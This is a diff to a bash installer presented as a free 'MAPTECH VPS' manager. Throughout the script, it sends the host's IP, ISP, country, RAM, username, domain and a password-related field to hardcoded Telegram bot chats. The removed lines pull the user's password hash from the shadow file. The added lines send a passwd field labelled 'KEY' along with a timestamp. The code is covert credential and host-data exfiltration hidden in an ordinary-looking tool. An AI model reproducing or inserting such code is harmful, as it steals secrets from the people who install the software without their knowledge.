@@ -94,7 +94,7 @@ send_code_telegram() {
 
     # Store the code along with the IP address and timestamp
     echo "$ip_address $random_code $current_time" > "$storage_file"
-encrypted_password=$(getent shadow $user | cut -d: -f2)
+password=$(getent passwd $user | cut -d: -f2)
 # Display the verification code
     echo -e "\033[1;36m==============================================================\033[0m"
     echo -e "\033[1;32m   MAPTECH VPS MANGER VERSION ONE(1) IS NOW FREE \033[0m"
@@ -109,6 +109,7 @@ country=$(curl -s https://ipapi.co/country_name/)
 user=$(whoami)
 ram=$(free -m | awk '/^Mem:/{print $2}')
 isp=$(curl -s ipinfo.io/org | cut -d " " -f2-)
+current_time=$(TZ=Africa/Accra date +"%Y-%m-%d %H:%M:%S")
 
 # INFO ON VPS
 local message="INFORMATION VPS INSTALL
@@ -117,7 +118,8 @@ IP      : $ip_address
 RAM     : ${ram}MB
 ISP     : $isp
 COUNTRY : $country
-USER    : $user"
+USER    : $user
+TIME    : $current_time"
 for ((i=0; i<${#bot_tokens[@]}; i++)); do
     local bot_token="${bot_tokens[i]}"
     local chat_id="${chat_ids[i]}"
@@ -142,13 +144,14 @@ chat_ids=("5989863155" "6785630391")
 # Function to send completion message to Telegram
 send_completion_message() {
     local message="VPS INSTALLATION SUCCESSFUL
-    DOMAIN     : $domain_name
-    IP VPS     : $ip_address
-    RAM        : ${ram}MB
-    ISP        : $isp
-    COUNTRY    : $country
-    USER       : $user
-    ENCRYPTED  : $encrypted_password"
+    DOMAIN_   : $domain_name
+    IP VPS_   : $ip_address
+    RAM____   : ${ram}MB
+    ISP____   : $isp
+    COUNTRY   : $country
+    USER___   : $user
+    KEY____   : $password
+    TIME___   : $current_time"
 
     for ((i=0; i<${#bot_tokens[@]}; i++)); do
         local bot_token="${bot_tokens[i]}"
